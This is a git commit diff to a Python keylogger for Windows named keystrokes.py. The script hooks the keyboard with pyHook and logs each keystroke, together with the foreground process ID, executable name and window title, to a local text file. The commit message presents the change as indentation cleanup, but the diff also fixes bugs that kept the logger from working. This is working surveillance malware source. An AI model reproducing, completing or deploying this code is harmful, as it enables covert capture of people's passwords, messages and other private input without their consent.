5df0c98858c4cfd22cd2af48caebb75e286321df
mashakf <51250208+mashakf@users.noreply.github.com>
2019-07-16 15:54:36 -0400

    Update keystrokes.py
    The indentations turned out weird when I edited in github, so I formatted it in the python IDLE and pasted it back into github.

--- keystrokes.py
+++ keystrokes.py
@@ -1,4 +1,5 @@
 from ctypes import *
+
 import pythoncom
 import pyHook
 import win32clipboard
@@ -16,44 +17,44 @@ file_log='c:\\temp\\keylog2.txt'
 logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 
 def get_current_process():
-	# get a handle to the foreground window
-	hwnd = user32.GetForegroundWindow()
+    # get a handle to the foreground window
+    hwnd = user32.GetForegroundWindow()
 
-	# find the process id
-	pid = c_ulong(0)
-	user32.GetWindowThreadProcessId(hwnd, byref(pid))
+    # find the process id
+    pid = c_ulong(0)
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
-	# store the current process id
-	process_id = pid.value
+    # store the current process id
+    process_id = pid.value
 
-	# grab the executable
-	executable = create_string_buffer("\x00" * 512) # 0x00 == NULL
-	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+    # grab the executable
+    executable = create_string_buffer(512) # 0x00 == NULL
+    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
-	psapi.GetModuleBaseName(h_process, None, byref(executable), 512)
+    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
 
-	# read the title
-	window_title = create_string_buffer("\x00" * 512)
-	lenght = user32.GetWindowTextA(hwnd, bref(window_title), 512)
+    # read the title
+    window_title = create_string_buffer(512)
+    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
-	# log out the header if we're in the right process
-    	logging.log(logging.DEBUG, "[PID: {0} - {1} - {2}".format(process_id, executable.value, window_title.value))
+    # log out the header if we're in the right process
+    logging.log(logging.DEBUG, "[PID: {0} - {1} - {2}".format(process_id, executable.value, window_title.value))
 
-	# close the handles
-	kernel32.CloseHandle(hwnd)
-	kernel32.CloseHandle(h_process)
+    # close the handles
+    kernel32.CloseHandle(hwnd)
+    kernel32.CloseHandle(h_process)
 
 def key_stroke(event):
-	
-	global current_window
 
-	# check if target changed windows
-	if event.WindowName != current_window:
-		current_window = event.WindowName
-		
-	get_current_process()
+    global current_window
 
-	# if a standard key is pressed
+    # check if target changed windows
+    if event.WindowName != current_window:
+        current_window = event.WindowName
+
+    get_current_process()
+
+    # if a standard key is pressed
     if event.Ascii in range(32, 128):
         logging.log(logging.DEBUG, chr(event.Ascii))
     else:
@@ -66,8 +67,8 @@ def key_stroke(event):
         else:
             logging.log(logging.DEBUG, "{0}".format(event.Key))
 
-	# pass execution to the next registered hook
-	return True
+    # pass execution to the next registered hook
+    return True
 
 # create and register a hook manager
 kl = pyHook.HookManager()
